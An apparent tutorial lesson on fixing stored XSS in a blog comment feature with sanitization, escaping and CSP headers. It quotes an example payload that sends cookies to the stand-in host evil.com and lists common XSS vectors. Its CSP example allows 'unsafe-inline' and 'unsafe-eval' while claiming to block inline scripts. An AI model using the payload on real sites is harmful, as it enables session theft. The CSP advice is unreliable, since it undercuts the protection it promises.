# Lesson 5: Security Enhancement - Input Sanitization

**Time:** 30 minutes
**Difficulty:** Intermediate

## Learning Objective
Learn to add security enhancements including input sanitization to prevent vulnerabilities like XSS (Cross-Site Scripting) and injection attacks in existing code.

## The Enhancement
Your blog comment feature currently displays user input directly without sanitization, making it vulnerable to XSS attacks. Add proper input sanitization and output encoding.

---

## Current State (Vulnerable Code)

### API Route - No Input Validation
```pseudo
// API Route: POST /api/comments
function POST(request):
  { name, content, postId } = parseJSON(request.body)

  // VULNERABLE: No sanitization or validation!
  newComment = database.insert('comments', {
    name: name,          // Could contain malicious HTML
    content: content,    // Could contain malicious scripts
    postId: postId
  })

  return jsonResponse(newComment)
end
```

### Display Page - Unsafe HTML Rendering
```pseudo
// Post Page Component
function PostPage({ postId }):
  // Fetch comments from database
  postComments = database.query('comments')
    .where('postId', '=', postId)
    .getAll()

  return renderView(
    <div>
      <h1>Comments</h1>
      {postComments.map(comment => (
        <div key={comment.id}>
          <h3>{comment.name}</h3>
          // VULNERABLE: Renders HTML without escaping!
          <div innerHTML={comment.content} />
        </div>
      ))}
    </div>
  )
end
```

**Vulnerability Example:** Attacker can submit:
```html
<!-- Malicious comment content -->
<script>
  // Steal cookies and send to attacker
  fetch('https://evil.com/steal?cookie=' + document.cookie);

  // Or redirect all users to phishing site
  window.location = 'https://phishing-site.com';

  // Or show fake login form
  document.body.innerHTML = '<form>Enter password...</form>';
</script>
```

**Impact:** This malicious code executes in every visitor's browser! 🔴

---

## Part 1: Understand the Vulnerability (5 mins)

### Sample Prompt
```
I have a blog comment feature:
[paste code]

Currently it uses dangerouslySetInnerHTML which I know is risky.

Help me understand:
1. What XSS attacks can happen here?
2. What data should be sanitized?
3. Where should sanitization happen (input or output)?
4. What library should I use?
5. Should I allow any HTML or strip it all?
```

### Understanding XSS

**Types of XSS:**
1. **Stored XSS** - Malicious code saved in database (your case!)
2. **Reflected XSS** - Malicious code in URL parameters
3. **DOM-based XSS** - Client-side JavaScript vulnerability

**Defense Layers:**
1. **Input Sanitization** - Clean data before storing
2. **Output Encoding** - Escape data when displaying
3. **Content Security Policy** - Browser-level protection

## Part 2: Add Input Sanitization (10 mins)

### Sample Prompt
```
Add input sanitization to my comment API:
[paste API code]

Requirements:
1. Install a sanitization library (DOMPurify or similar)
2. Strip dangerous HTML (script tags, event handlers)
3. Allow safe HTML (bold, italic, links)
4. Sanitize before saving to database
5. Keep it server-side (Next.js API route)

Use isomorphic-dompurify for server+client support.
```

### Install Sanitization Library

```bash
# Install sanitization library for your language/framework
# Examples:
# - npm install isomorphic-dompurify (JavaScript)
# - pip install bleach (Python)
# - gem install sanitize (Ruby)
# - go get github.com/microcosm-cc/bluemonday (Go)
```

### Create Sanitization Utility

```pseudo
// src/lib/sanitize - Sanitization Utility

/**
 * Sanitizes HTML content to prevent XSS attacks
 * Allows safe HTML tags while removing dangerous ones
 */
function sanitizeHTML(dirty):
  return HTMLSanitizer.clean(dirty, {
    allowedTags: [
      'b', 'i', 'em', 'strong', 'a', 'p', 'br',
      'ul', 'ol', 'li', 'blockquote', 'code'
    ],
    allowedAttributes: ['href', 'title', 'target'],
    allowDataAttributes: false
  })
end

/**
 * Strips all HTML tags, returning plain text
 * Use for names, titles, or when no HTML is allowed
 */
function stripHTML(dirty):
  return HTMLSanitizer.clean(dirty, {
    allowedTags: [],
    allowedAttributes: []
  })
end

/**
 * Sanitizes user input for database storage
 * - Strips HTML from name/title fields
 * - Sanitizes HTML in content fields
 */
function sanitizeCommentInput(input):
  return {
    name: stripHTML(trim(input.name)),
    content: sanitizeHTML(trim(input.content))
  }
end
```

### Update API Route

```pseudo
// API Route: POST /api/comments - Secured with Sanitization
import sanitizeCommentInput from 'src/lib/sanitize'

function POST(request):
  { name, content, postId } = parseJSON(request.body)

  // SECURE: Sanitize input before saving
  sanitized = sanitizeCommentInput({ name, content })

  // Validate after sanitization
  if NOT sanitized.name OR length(sanitized.name) == 0:
    return jsonResponse(
      { error: 'Name is required' },
      status: 400
    )
  end

  if NOT sanitized.content OR length(sanitized.content) == 0:
    return jsonResponse(
      { error: 'Content is required' },
      status: 400
    )
  end

  newComment = database.insert('comments', {
    name: sanitized.name,
    content: sanitized.content,
    postId: postId
  })

  return jsonResponse(newComment)
end
```

## Part 3: Secure Output Rendering (10 mins)

### Sample Prompt
```
Update my post page to safely render comments:
[paste page code]

Remove dangerouslySetInnerHTML and use React's safe rendering.
Since we sanitized input, we can trust the HTML now.
```

### Option 1: Safe Rendering (Recommended)

```pseudo
// Post Page Component - Server-side
function PostPage(postId):
  // Fetch comments from database
  postComments = database.query('comments')
    .where('postId', '=', postId)
    .getAll()

  return renderView(
    <div>
      <h1>Comments</h1>
      {postComments.map(comment => (
        <div key={comment.id}>
          {/* SECURE: Framework auto-escapes text content */}
          <h3>{comment.name}</h3>

          {/* SECURE: Since we sanitized on input, HTML is safe */}
          <div renderHTML={comment.content} />

          {/* Or use component for double sanitization */}
          <CommentContent html={comment.content} />
        </div>
      ))}
    </div>
  )
end
```

### Option 2: Double Sanitization Component (Extra Safe)

```pseudo
// CommentContent Component - Client-side
import HTMLSanitizer from 'sanitization-library'

function CommentContent(html):
  // Double sanitize on output (defense in depth)
  clean = HTMLSanitizer.clean(html, {
    allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    allowedAttributes: ['href']
  })

  return renderView(
    <div renderHTML={clean} />
  )
end
```

## Part 4: Add Content Security Policy (5 mins)

### Sample Prompt
```
Add Content Security Policy headers to my Next.js app for additional XSS protection.

1. Block inline scripts
2. Only allow scripts from same origin
3. Add to middleware or next.config.js
```

### Add CSP Headers

```pseudo
// Middleware - Security Headers
function securityMiddleware(request):
  response = continueRequest()

  // Content Security Policy - Browser-level XSS protection
  cspPolicy = [
    "default-src 'self'",
    "script-src 'self' 'unsafe-eval' 'unsafe-inline'",  // Adjust for your needs
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https:",
    "font-src 'self'",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
    "upgrade-insecure-requests"
  ]

  response.setHeader('Content-Security-Policy', join(cspPolicy, '; '))

  // Other security headers
  response.setHeader('X-Content-Type-Options', 'nosniff')
  response.setHeader('X-Frame-Options', 'DENY')
  response.setHeader('X-XSS-Protection', '1; mode=block')
  response.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin')

  return response
end

// Apply to all routes
config = {
  matcher: '/:path*'
}
```

## Success Criteria
- [ ] Input sanitization library installed
- [ ] Name field strips all HTML
- [ ] Content field allows safe HTML only
- [ ] Dangerous tags (script, iframe) are removed
- [ ] Event handlers (onclick, onerror) are removed
- [ ] Output rendering is safe
- [ ] CSP headers added
- [ ] Tests verify sanitization works

## Testing Security

### Manual Testing

```bash
# Test malicious input
curl -X POST http://localhost:3000/api/comments \
  -H "Content-Type: application/json" \
  -d '{
    "name": "<script>alert(1)</script>Admin",
    "content": "<img src=x onerror=alert(1)>Hello",
    "postId": 1
  }'
```

**Expected Result:**
- Name: "Admin" (script tag stripped)
- Content: "Hello" (img tag with onerror stripped)

### Automated Tests

```pseudo
// src/lib/__tests__/sanitize.test
import { describe, it, expect } from 'testing-framework'
import { sanitizeHTML, stripHTML, sanitizeCommentInput } from '../sanitize'

describe('sanitizeHTML', () => {
  it('should allow safe HTML tags', () => {
    input = '<p>Hello <strong>world</strong>!</p>'
    output = sanitizeHTML(input)
    expect(output).toBe('<p>Hello <strong>world</strong>!</p>')
  })

  it('should remove script tags', () => {
    input = '<p>Hello</p><script>alert("XSS")</script>'
    output = sanitizeHTML(input)
    expect(output).not.toContain('<script>')
    expect(output).toContain('<p>Hello</p>')
  })

  it('should remove event handlers', () => {
    input = '<img src="x" onerror="alert(1)">'
    output = sanitizeHTML(input)
    expect(output).not.toContain('onerror')
  })

  it('should remove javascript: URLs', () => {
    input = '<a href="javascript:alert(1)">Click</a>'
    output = sanitizeHTML(input)
    expect(output).not.toContain('javascript:')
  })
})

describe('stripHTML', () => {
  it('should remove all HTML tags', () => {
    input = '<script>alert(1)</script><b>Admin</b>'
    output = stripHTML(input)
    expect(output).toBe('Admin')
  })
})

describe('sanitizeCommentInput', () => {
  it('should strip HTML from name', () => {
    input = {
      name: '<script>alert(1)</script>John',
      content: '<p>Hello</p>'
    }
    output = sanitizeCommentInput(input)
    expect(output.name).toBe('John')
  })

  it('should sanitize content HTML', () => {
    input = {
      name: 'John',
      content: '<p>Hello</p><script>alert(1)</script>'
    }
    output = sanitizeCommentInput(input)
    expect(output.content).toContain('<p>Hello</p>')
    expect(output.content).not.toContain('<script>')
  })
})
```

## Key Learning Points
1. **Defense in Depth** - Multiple layers of protection
2. **Input Sanitization** - Clean data before storing
3. **Output Encoding** - Escape data when displaying
4. **Never Trust User Input** - Always validate and sanitize
5. **CSP** - Browser-level protection against XSS

## Common XSS Vectors to Block

```javascript
// Script injection
<script>alert('XSS')</script>

// Event handlers
<img src=x onerror=alert(1)>
<body onload=alert(1)>

// JavaScript URLs
<a href="javascript:alert(1)">Click</a>

// Data URIs
<iframe src="data:text/html,<script>alert(1)</script>">

// SVG scripts
<svg onload=alert(1)>

// Style injection
<style>body{background:url('javascript:alert(1)')}</style>
```

## Production Checklist
- [ ] All user input sanitized
- [ ] Output properly encoded
- [ ] CSP headers configured
- [ ] Security tests passing
- [ ] No dangerouslySetInnerHTML (or properly sanitized)
- [ ] SQL queries use parameterized queries (prevents SQL injection)
- [ ] File uploads validate content type

## Resources
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [Content Security Policy Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

## Next Steps
After completing this lesson, you've covered the core feature enhancement skills! Review the chapter README for advanced topics.
